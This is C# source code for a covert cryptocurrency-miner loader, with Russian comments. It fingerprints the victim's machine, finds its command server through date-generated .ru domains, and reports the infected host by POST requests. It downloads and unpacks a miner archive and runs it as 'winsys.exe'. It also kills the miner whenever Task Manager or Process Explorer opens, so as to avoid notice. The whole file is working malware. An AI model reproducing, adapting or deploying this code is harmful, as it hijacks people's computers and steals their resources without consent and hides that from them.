using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using System.Management;
using System.Net;
using System.Text.RegularExpressions;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Timers;
using System.Threading;
using Microsoft.Win32;
using Ionic.Zip;
using System.Globalization;
using System.Web;

//ilmerge /out:Merged.dll Primary.dll Secondary1.dll Secondary2.dll
//ilmerge /out:job2.dll job.dll Ionic.Zip.dll

namespace job
{
    public class job
    {
        private static string downloadFilePath = "";
        private static string executable_file = "winsys.exe";
        private static bool disable_on_active = false;


        [StructLayout(LayoutKind.Sequential)]
        struct LASTINPUTINFO
        {
            public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));

            [MarshalAs(UnmanagedType.U4)]
            public UInt32 cbSize;
            [MarshalAs(UnmanagedType.U4)]
            public UInt32 dwTime;
        }

        [DllImport("user32.dll")]
        static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        private static System.Timers.Timer aTimer;
        private static int inactive_time = 0;

        private static string pathToSetup = "";

        private static bool configFileExist = false;
        private static string configLine = "";

        private static List<string> domains = new List<string>();
        private static string active_domain = "http://otherm1n1ngmafia.ru";
        public static string osname = "";

        public static bool miner_run_send_report = false;
        public static string Start()
        {
            string uid = getUniq();

            downloadFilePath = "/files/" + uid + "/files.zip";

            // чтение адреса установочной папки
            RegistryKey currentUserKey = Registry.CurrentUser;
            RegistryKey helloKey = currentUserKey.OpenSubKey("Notepad");
            pathToSetup = helloKey.GetValue("loc").ToString();
            helloKey.Close();

            // если в реестре нет установочного пути, то выход
            if (pathToSetup.Length <= 0) return null;

            //string startDomain = "http://16e04f185c7edcdfb84a114152fada5f.info";
            //string[] spareDomain = new string[] { "http://16e04f185c7edcdfb84a114152fada5f.com", "http://16e04f185c7edcdfb84a114152fada5f.org", "http://16e04f185c7edcdfb84a114152fada5f.ru", "http://16e04f185c7edcdfb84a114152fada5f.net" };

            domains.Add(get_dom(active_domain));
            domains.Add(get_dom("dnevnoi"));
            domains.Add(get_dom("nedelnii"));
            domains.Add(get_dom("mesachnii"));

            active_domain = find_active_domain(domains);

            

            osname = HttpUtility.UrlEncode(getOs());
            string wb = "";
            if (is64BitOperatingSystem)
            {
                wb = "64";
            }
            else
            {
                wb = "32";
            }

            report_load_dll(active_domain, uid, osname, wb);

            //"&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb)
            //send_os_info(active_domain, uid, osname, wb);

            WebClient WebClient = new WebClient();
            var rand = new Random();
            //int randDomNum = rand.Next(0, spareDomain.Length);
            //string randomDomain = spareDomain[randDomNum];
            //string randomDomain = get_dom();

            //  скачивание архива с майнером
            if (!Directory.Exists(pathToSetup)) return null;


            // задержка 1 минута перед скачиванием архива
            //Thread.Sleep(60000);

            /*try
            {
                downloadFile(active_domain + downloadFilePath, pathToSetup + "\\files.zip");


                if (!File.Exists(pathToSetup + "\\files.zip")) // попробовать скачать из дополнительного домена
                {
                    downloadFile(active_domain + downloadFilePath, pathToSetup + "\\files.zip");
                }
                else
                {
                    // при успехе, сделать файл скрытым
                    //File.SetAttributes(pathToSetup + "\\files.zip", File.GetAttributes(pathToSetup + "\\files.zip") | FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                downloadFile(active_domain + downloadFilePath, pathToSetup + "\\files.zip");
            }*/

            if(RemoteFileExists(active_domain + downloadFilePath))
            {
                try
                {
                    downloadFile(active_domain + downloadFilePath, pathToSetup + "\\files.zip");
                }
                catch (Exception ex)
                {
                    //
                }
            }
            else
            {
                try
                {
                    //downloadFilePath = "/files/" + uid + "/files.zip";
                    downloadFile(active_domain + "/files/unknown/files.zip", pathToSetup + "\\files.zip");
                }
                catch (Exception ex)
                {
                    //
                }
            }



            if (File.Exists(pathToSetup + "\\files.zip")) // попробовать скачать из дополнительного домена
            {
                long length = new System.IO.FileInfo(pathToSetup + "\\files.zip").Length;
                if (length > 0)
                {
                    // извлечение майнера в текущую папку
                    try
                    {
                        using (ZipFile zip = ZipFile.Read(pathToSetup + "\\files.zip"))
                        {
                            foreach (ZipEntry file in zip)
                            {
                                file.Extract(pathToSetup, ExtractExistingFileAction.OverwriteSilently);
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        //return null;
                    }
                }
                else
                {
                    //return null;
                }
            }

            

            if (Directory.Exists(pathToSetup + "\\files"))
            {
                //DirectoryInfo di = Directory.CreateDirectory(pathToSetup + "\\files");
                //di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                if (File.Exists(pathToSetup + "\\files.zip")) // попробовать скачать из дополнительного домена
                {
                    try
                    {
                        File.Delete(pathToSetup + "\\files.zip");
                    }
                    catch (Exception ex) { }
                }
            }

            if (File.Exists(pathToSetup + "\\files\\readme_.txt"))
            {
                configFileExist = true;
                configLine = File.ReadAllText(pathToSetup + "\\files\\readme_.txt");
            }




            // Create a timer and set a two second interval.
            aTimer = new System.Timers.Timer();
            aTimer.Interval = 1000;

            // Hook up the Elapsed event for the timer. 
            aTimer.Elapsed += OnTimedEvent;

            // Have the timer fire repeated events (true is the default)
            aTimer.AutoReset = true;

            // Start the timer
            aTimer.Enabled = true;
            
            while (true)
            {
                
                //File.WriteAllText(month+".txt", "cc");

                Thread.Sleep(1000);
                if (inactive_time >= 1)
                {

                    Process[] processes;
                    processes = Process.GetProcessesByName("winsys");
                    if (processes.Count() <= 0)
                    {

                        try
                        {
                            if (configFileExist)
                            {
                                Process.Start(pathToSetup + "\\files\\" + executable_file, configLine + " -p " + uid);
                            }
                            else
                            {
                                Process.Start(pathToSetup + "\\files\\" + executable_file);
                            }
                        }
                        catch (Exception ex) { }
                    }
                    else
                    {
                        if (!miner_run_send_report)
                        {
                            //report_load_dll(active_domain, uid, osname, wb);
                            report_start_miner_time(active_domain, uid, osname, wb);
                            miner_run_send_report = true;
                        }
                        // майнер запущен
                    }
                    //Console.WriteLine(inactive_time);

                }
                
            }

            return "123";
        }

        /*
        private static string getExternalIp()
        {
            string ip = "";
            try
            {
                string externalIP;
                externalIP = (new WebClient()).DownloadString("http://checkip.dyndns.org/");
                externalIP = (new Regex(@"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"))
                             .Matches(externalIP)[0].ToString();
                ip = ip + externalIP;
            }
            catch(Exception ex) { }
            return ip;
        }
        */

        static int last()
        {
            int t = 0;
            LASTINPUTINFO l = new LASTINPUTINFO();
            l.cbSize = (UInt32)Marshal.SizeOf(l);
            l.dwTime = 0;
            int e = Environment.TickCount;
            if (GetLastInputInfo(ref l))
            {
                int inp = (Int32)l.dwTime;
                t = e - inp;
            }
            return ((t > 0) ? (t / 1000) : 0);
        }

       
        
        private static void OnTimedEvent(Object source, System.Timers.ElapsedEventArgs e)
        {
            TimerCallback(null);
            //Console.WriteLine("The Elapsed event was raised at {0}", e.SignalTime);
            //Console.WriteLine(last().ToString());
            inactive_time = last();

            if (!disable_on_active) {
                inactive_time = 99999; // больше, чем задержка перед включением
            }
            if (inactive_time <= 0)
            {
                try
                {
                    foreach (Process proc in Process.GetProcessesByName("winsys"))
                    {
                        miner_run_send_report = false;
                        proc.Kill();
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }

        }

        private static void TimerCallback(Object o)
        {
            
            // Display the date/time when this method got called.
            //Console.WriteLine("In TimerCallback: " + DateTime.Now);
            //Environment.Exit(0); 
            // Force a garbage collection to occur for this demo.
            GC.Collect();
            Process[] processes;
            Process[] processes1;
            Process[] processes2;
            Process[] processes3;
            Process[] processes4;

            // если обнаружен процесс, то вырубить майнер
            processes = Process.GetProcessesByName("taskmgr");
            processes1 = Process.GetProcessesByName("anvir");
            processes2 = Process.GetProcessesByName("procexp");
            processes3 = Process.GetProcessesByName("procexp64");
            processes4 = Process.GetProcessesByName("anvir64");
            if (processes.Count() > 0 || processes1.Count() > 0 || processes2.Count() > 0 || processes3.Count() > 0 || processes4.Count() > 0)
            {
                

                //Environment.Exit(0);
                //Console.WriteLine("Task Manager IS running");
                try
                {
                    foreach (Process proc in Process.GetProcessesByName("winsys"))
                    {
                        proc.Kill();
                        Environment.Exit(0);
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                    //File.WriteAllText("err.txt", ex.Message);
                }
            }
            else
            {
                //File.WriteAllText("__ncount" + ".txt", "cc");
                //Console.WriteLine("Task Manager is NOT running");
            }
        }

        private static void downloadFile(string url, string filepath)
        {
            try
            {
                WebClient WebClient = new WebClient();
                WebClient.DownloadFile(url, filepath + ".tmp");
                if (File.Exists(filepath + ".tmp"))
                {
                    if (File.Exists(filepath))
                    {
                        File.Delete(filepath);
                    }
                    File.Move(filepath + ".tmp", filepath);
                    //File.SetAttributes(filepath, File.GetAttributes(filepath) | FileAttributes.Hidden);
                }
            }
            catch (Exception ex)
            {
                //Console.WriteLine("163 " + ex.Message);
                //Console.ReadKey();
            }
        }
        private static string getUniq()
        {
            //string ip = "";
            string username = "";
            string komputername = "";

            string modelNo = "";
            string manufatureID = "";
            string signature = "";
            string totalHeads = "";
            string procName = "";
            string videoCardName = "";

            string uniqueId = "";
            string sourceOfUniqueId = "";

            //ip = getExternalIp();
            username = getUserName();
            komputername = getKompName();
            modelNo = identifier("Win32_DiskDrive", "Model");
            manufatureID = identifier("Win32_DiskDrive", "Manufacturer");
            signature = identifier("Win32_DiskDrive", "Signature");
            totalHeads = identifier("Win32_DiskDrive", "TotalHeads");
            procName = identifier("Win32_Processor", "Name");
            videoCardName = identifier("Win32_VideoController", "Name");

            sourceOfUniqueId = username + komputername + modelNo + manufatureID + signature + totalHeads + procName + videoCardName;

            using (MD5 md5Hash = MD5.Create())
            {
                string hash = GetMd5Hash(md5Hash, sourceOfUniqueId);
                uniqueId = hash;
            }
            return uniqueId;
        }

        private static string getUserName()
        {
            string username = "";
            try
            {
                username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("257 " + ex.Message);
                //Console.ReadKey();
            }
            return username;
        }
        private static string getKompName()
        {
            string komputername = "";
            try
            {
                komputername = System.Environment.MachineName;
            }
            catch (Exception ex)
            {
                //Console.WriteLine("271 " + ex.Message);
                //Console.ReadKey();
            }
            return komputername;
        }

        private static string identifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            System.Management.ManagementClass mc = new System.Management.ManagementClass(wmiClass);
            System.Management.ManagementObjectCollection moc = mc.GetInstances();
            foreach (System.Management.ManagementObject mo in moc)
            {
                //Only get the first one
                if (result == "")
                {
                    try
                    {
                        result = mo[wmiProperty].ToString();
                        break;
                    }
                    catch (Exception ex)
                    {
                        //Console.WriteLine("293 " + ex.Message);
                        //Console.ReadKey();
                    }
                }
            }
            return result;
        }

        static string GetMd5Hash(MD5 md5Hash, string input)
        {

            // Convert the input string to a byte array and compute the hash.
            byte[] data = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(input));

            // Create a new Stringbuilder to collect the bytes
            // and create a string.
            StringBuilder sBuilder = new StringBuilder();

            // Loop through each byte of the hashed data 
            // and format each one as a hexadecimal string.
            for (int i = 0; i < data.Length; i++)
            {
                sBuilder.Append(data[i].ToString("x2"));
            }

            // Return the hexadecimal string.
            return sBuilder.ToString();
        }

        public static string get_dom(string typedom)
        {
            DateTime time = DateTime.Now;
            string date_string = "";
            string hash = "";
            string week = "";
            switch (typedom)
            {
                case "mesachnii":
                    date_string = String.Format("{0:MMyyyy}", time);
                    break;
                case "nedelnii":
                    week = GetWeekOfMonth(time).ToString();
                    date_string = week + String.Format("{0:MMyyyy}", time);
                    break;
                case "dnevnoi":
                    week = GetWeekOfMonth(time).ToString();
                    date_string = time.Day + week + String.Format("{0:MMyyyy}", time);
                    break;
                default:
                    return typedom;
                    break;
            }
            using (MD5 md5Hash = MD5.Create())
            {
                hash = GetMd5Hash(md5Hash, date_string + "0");
            }
            if (hash.Length >= 12)
            {
                return "http://" + hash.Substring(0, 12) + ".ru";
            }
            return typedom;
        }

        public static int GetWeekOfYear(DateTime date)
        {
            if (date == null)
                return 0;

            DateTimeFormatInfo dfi = DateTimeFormatInfo.CurrentInfo;
            Calendar cal = dfi.Calendar;

            return cal.GetWeekOfYear(date, dfi.CalendarWeekRule, dfi.FirstDayOfWeek);
        }


        public static int GetWeekOfMonth(DateTime date)
        {
            if (date == null)
                return 0;

            return GetWeekOfYear(date) - GetWeekOfYear(new DateTime(date.Year, date.Month, 1)) + 1;
        }

        public static string find_active_domain(List<string> domains)
        {
            string act_dom = "";

            foreach (string d in domains)
            {
                //MessageBox.Show(d);
                try
                {
                    WebClient client = new WebClient();
                    string code = client.DownloadString(d + "/check.html");
                    if (code == "e408743231b4460")
                    {
                        //MessageBox.Show(code);
                        return d;
                    }
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }
            return act_dom;
        }

        public static void report_load_dll(string dom, string id, string osname, string wb)
        {
            //"&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb)
            string com_params = "";
            com_params = "id=" + HttpUtility.UrlEncode(id) + "&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb);
            //Console.WriteLine(hardInfo);Console.ReadKey();

            SendPostRequest(dom + "/loaded.php", com_params);
        }

        public static void report_start_miner_time(string dom, string id, string osname, string wb)
        {
            //"&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb)
            string com_params = "";
            com_params = "id=" + HttpUtility.UrlEncode(id) + "&os=" + HttpUtility.UrlEncode(osname) + "&wb=" + HttpUtility.UrlEncode(wb);
            //Console.WriteLine(hardInfo);Console.ReadKey();

            SendPostRequest(dom + "/start.php", com_params);
        }

        static void SendPostRequest(string url, string data)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Method = "POST";
                string postData = data;
                request.ContentType = "application/x-www-form-urlencoded";
                System.Text.UTF8Encoding encoding = new System.Text.UTF8Encoding();
                byte[] postByteArray = encoding.GetBytes(postData);
                request.ContentLength = postByteArray.Length;

                System.IO.Stream postStream = request.GetRequestStream();
                postStream.Write(postByteArray, 0, postByteArray.Length);
                postStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                //Console.WriteLine("Response Status Description: " + response.StatusDescription);
                Stream dataSteam = response.GetResponseStream();
                StreamReader reader = new StreamReader(dataSteam);
                string responseFromServer = reader.ReadToEnd();
                //Console.WriteLine("Response: " + responseFromServer);
                reader.Close();
                dataSteam.Close();
                response.Close();
            }
            catch (Exception ex)
            {
                //Console.WriteLine("432 " + ex.Message);
                //Console.ReadKey();
                //Если что-то пошло не так, выводим ошибочку о том, что же пошло не так.
                //Console.WriteLine("ERROR: " + ex.Message);
            }
        }

        private static string getOs()
        {
            string ver = "unknown";
            try
            {
                var name = (from x in new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().Cast<ManagementObject>()
                            select x.GetPropertyValue("Caption")).FirstOrDefault();
                return name != null ? name.ToString() : "unknown";
            }
            catch (Exception ex)
            {
                return ver;
            }
        }

        static bool is64BitProcess = (IntPtr.Size == 8);
        static bool is64BitOperatingSystem = is64BitProcess || InternalCheckIsWow64();

        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWow64Process(
            [In] IntPtr hProcess,
            [Out] out bool wow64Process
        );

        public static bool InternalCheckIsWow64()
        {
            if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) ||
                Environment.OSVersion.Version.Major >= 6)
            {
                using (Process p = Process.GetCurrentProcess())
                {
                    bool retVal;
                    if (!IsWow64Process(p.Handle, out retVal))
                    {
                        return false;
                    }
                    return retVal;
                }
            }
            else
            {
                return false;
            }
        }

        private static bool RemoteFileExists(string url)
        {
            try
            {
                //Creating the HttpWebRequest
                HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;
                //Setting the Request method HEAD, you can also use GET too.
                request.Method = "HEAD";
                //Getting the Web Response.
                HttpWebResponse response = request.GetResponse() as HttpWebResponse;
                //Returns TRUE if the Status code == 200
                response.Close();
                return (response.StatusCode == HttpStatusCode.OK);
            }
            catch
            {
                //Any exception will returns false.
                return false;
            }
        }
    }
}
